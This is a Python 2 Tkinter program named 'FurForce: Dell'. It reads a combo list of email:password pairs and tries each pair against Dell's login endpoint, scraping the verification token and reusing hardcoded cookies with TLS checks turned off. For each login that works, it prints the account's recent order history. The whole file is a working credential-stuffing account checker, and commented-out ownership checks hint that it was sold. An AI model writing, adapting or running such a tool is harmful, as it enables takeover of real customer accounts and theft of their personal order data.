# -*- coding: utf-8 -*-
__author__ = 'Furry~'
import requests
import re
import Tkinter as Tk
import concurrent.futures
import codecs
import urllib
import os
import base64
import binascii
import json
import time
import Cookie
import datetime
import cookielib
from tkFileDialog import askopenfilename
from random import choice


class App():
    def __init__(self, parent):

        # Check To See If You Purchased c:
        # self.ownercheck()

        # Check To See If There's An Update
        # self.updatecheck()

        # Setup Window
        self.window = parent
        self.window.title('FurForce: Dell')

        # Set Variables
        self.fileopenoptions = dict(defaultextension='.txt', filetypes=[('Text file', '*.txt'), ('All files', '*.*')])
        self.combos = Tk.StringVar(self.window)

        # Make Widgets
        self.labelcombos = Tk.Label(self.window, text="Combo List: ")
        self.entrycombos = Tk.Entry(self.window, textvariable=self.combos)
        self.startbutton = Tk.Button(self.window, text="Start!", command=self.start)
        self.combosbutton = Tk.Button(self.window, text="Open Combo File!", command=self.setcombos)

        # Grid Widgets
        self.labelcombos.grid(row=0, column=0, sticky=Tk.W)
        self.entrycombos.grid(row=0, column=1, columnspan=2, sticky=Tk.W+Tk.E+Tk.N+Tk.S)
        self.combosbutton.grid(row=0, column=3, sticky=Tk.W+Tk.E+Tk.N+Tk.S)
        self.startbutton.grid(row=5, column=0, columnspan=6, sticky=Tk.W+Tk.E+Tk.N+Tk.S)

    def Login(self, user, password):
        work = True
        while work:
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:30.0) Gecko/20100101 Firefox/30.0',
                'Cookie': 'ru=https://ecomm.dell.com/myaccount/main.aspx?c=us&l=en&s=dhs; SITESERVER=ID=92d07f1672e4454a8be26868e50ae813; SITESERVER_SESSION=ID=92d07f1672e4454a8be26868e50ae813; lwp=c=us&l=en&cs=19; __RequestVerificationToken_L0lkZW50aXR5L2dsb2JhbA2=rkVqHhMkF80_73KlkjKfrqK9HSSIUP2_pNscUvdy1AAnlE3xKfZXNETcd-odXQtve-p76Wn9sBukcRTWxbqyaOHBrIE1; mbox=check#true#1409983128|session#1409983067495-971071#1409984928|PC#1409983067495-971071.21_31#1411192672; ASP.NET_SessionId=mdq1ot443ujwqwbue0nnfxiw; s_cc=true; s_c49=c%3Dus%26l%3Den%26s%3Ddhs%26cs%3D19; gpv_pn=dell.com%2Fidentity%2Fglobal%2Flogin; s_ppv=dell.com%2Fidentity%2Fglobal%2Flogin%2C100%2C100%2C630; cidlid=%3A%3A; s_depth=1; s_dl=1; sessionTime=2014%2C8%2C5%2C22%2C57%2C53%2C800; s_hwp=19%7C%7Cnull%7C%7C5%3A9%3A2014%3A22%3A58%7C%7CN%7C%7CN%7C%7Cnull%7C%7C0%7C%7Cnull%7C%7Cnull%7C%7CN%7C%7Cnull%7C%7Cnull%7C%7Cnull; s_vnum=1441519073801%26vn%3D1; s_invisit=true; s_sq=dellglobalonline%3D%2526pid%253Ddell.com%25252Fidentity%25252Fglobal%25252Flogin%2526pidt%253D1%2526oid%253DSign%252520In%2526oidt%253D3%2526ot%253DSUBMIT; s_sv_sid=857291274372; s_vi=[CS]v1|2A0511E985314E91-4000011420005286[CE]; s_sv_112_p1=1@11@s/15062&e/2; s_sv_112_s1=1@16@a//1409983074997'
            }
            proxies = {
                'http': 'http://127.0.0.1:8888'
            }
            s = requests.session()
            dell = s.get('https://ecomm.dell.com/myaccount/main.aspx?c=us&l=en&s=dhs',
                                  verify=False, headers=headers, timeout=7.5, proxies=proxies,
                                     allow_redirects=True)
            apptoken = re.findall('<input name="__RequestVerificationToken" type="hidden" value="(.*?)" />', dell.text)
            connectionid = re.findall('<meta name="CONNECTIONID" content="(.*?)" />', dell.text)
            data = {
                '__RequestVerificationToken': apptoken[0],
                'sign-in-show-password-checkbox': 'false',
                'EmailAddress': user,
                'Password': password
            }
            payload = urllib.urlencode(data)
            s.headers.update({'referer': dell.url})
            response = s.post('https://www.dell.com/Identity/global/Login?connectionid={0}#26showsocialsignin=true#26wreply=https%3a%2f%2fecomm.dell.com%2fmyaccount%2fmain.aspx%3fc%3dus%26l%3den%26s%3ddhs'.format(connectionid[0]), payload, proxies=proxies,
                                     verify=False, timeout=7.5,
                                     allow_redirects=True)
            if '"Url":"https://' in response.text:
                order = s.get('https://www.dell.com/support/orderstatus/us/en/19/OrderStatus/RecentOrders?PageType=RecentOrders&5IsFirstTime=True', proxies=proxies,
                                     verify=False, timeout=7.5,
                                     allow_redirects=True)
                print order.text

            s.get('https://ecomm.dell.com/myaccount/logout.aspx?c=us&cs=19&l=en&s=dhs&~ck=pn&~ck=pn')
            work = False

    def start(self):
        if self.combos.get() == '':
            print 'You didn\'t add any combos!'
        else:
            with codecs.open(self.entrycombos.get(), 'r', encoding="utf-8") as f:
                global userpass
                userpass = f.readlines()
        with concurrent.futures.ThreadPoolExecutor(max_workers=1) as x:
            for userpasscombo in userpass:
                upass = userpasscombo.split(':')
                x.submit(self.Login, upass[0].strip(), upass[1].strip())

    def setcombos(self):
        filename = askopenfilename(**self.fileopenoptions)
        self.combos.set(filename)

    def setproxies(self):
        filename = askopenfilename(**self.fileopenoptions)
        self.proxies.set(filename)

if __name__ == '__main__':
    root = Tk.Tk()
    app = App(root)
    root.mainloop()